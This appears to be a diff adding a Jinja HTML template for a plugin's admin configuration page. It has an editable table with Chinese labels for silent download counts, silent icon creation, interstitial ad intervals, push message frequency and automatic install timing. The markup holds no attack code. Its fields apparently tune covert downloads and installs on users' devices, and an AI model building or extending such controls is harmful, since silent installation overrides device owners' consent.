@@ -1,0 +1,57 @@
+{% extends "plugin/layout.html" %}
+
+{% block sidebar_nav %}
+    {% from "common/sidebar.html" import sidebar_nav with context %}
+    {{ sidebar_nav('config') }}
+{% endblock %}
+
+
+{% block content %}
+    <div class="page-header head-green">
+        <h3><i class="icon ui setting circular"></i>修改配置</h3>
+    </div>
+
+    <div class="">
+    <table class="table" id="table" style="margin-bottom: 500px">
+        <thead>
+        <tr>
+            <th>版本号</th>
+            <th>静默下载个数</th>
+            <th>静默打图标个数</th>
+            <th>插屏展示时间间隔</th>
+            <th>推送消息数</th>
+            <th>推送时间间隔</th>
+            <th>下载图标地址</th>
+            <th>引导激活天数</th>
+            <th>自动安装时间(分)</th>
+        </tr>
+        </thead>
+        <tbody>
+        <form method="post">
+            {% if query %}
+                {% for item in query %}
+                    <tr>
+                        <td hidden=""><input value="{{ item.id }}" name="id" readonly style="background-color: #ffffff"
+                                   class="fix-50px"></td>
+                        <td>{{ item.version }}</td>
+                        <td><input value="{{ item.auto_download }}" name="auto_download" class="fix-50px"></td>
+                        <td><input value="{{ item.auto_icon }}" name="auto_icon" class="fix-50px"></td>
+                        <td><input value="{{ item.show_interval }}" name="show_interval" class="fix-50px"></td>
+                        <td><input value="{{ item.push_msg }}" name="push_msg" class="fix-50px"></td>
+                        <td><input value="{{ item.push_msgInterval }}" name="push_msgInterval" class="fix-50px"></td>
+                        <td><input value="{{ item.image_downloadText }}" name="image_downloadText" class="fix-50px">
+                        </td>
+                        <td><input value="{{ item.auto_activeDays }}" name="auto_activeDays" class="fix-50px"></td>
+                        <td><input value="{{ item.auto_installMins }}" name="auto_installMins" class="fix-50px"></td>
+                        <td>
+                            <button type="submit" class="ui button mini blue">确认</button>
+                        </td>
+                    </tr>
+                {% endfor %}
+            {% endif %}
+        </form>
+        </tbody>
+    </table>
+    </div>
+{% endblock %}
+
